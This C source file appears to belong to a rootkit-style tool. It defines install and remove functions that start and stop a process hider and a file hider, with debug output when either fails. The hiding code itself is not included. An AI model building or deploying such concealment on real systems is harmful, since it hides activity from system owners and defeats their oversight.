#include "hide/hide_management.h"

#include "hide/file/filehider.h"
#include "hide/process/processhider.h"
#include "dbgutils.h"


int hide_install()
{
    if( !processhider_init() )
    {
        DEBUG_PRINT("processhider_init failed\n");
        return ( 0 );
    }

    if( !filehider_init() )
    {
        DEBUG_PRINT("filehider_init failed\n");
        return ( 0 );
    }

    return ( 1 );
}

int hide_remove()
{
    if( !processhider_deinit() )
    {
        DEBUG_PRINT("processhider_deinit failed\n");
        return ( 0 );
    }

    if( !filehider_deinit() )
    {
        DEBUG_PRINT("filehider_deinit failed\n");
        return ( 0 );
    }

    return ( 1 );
}
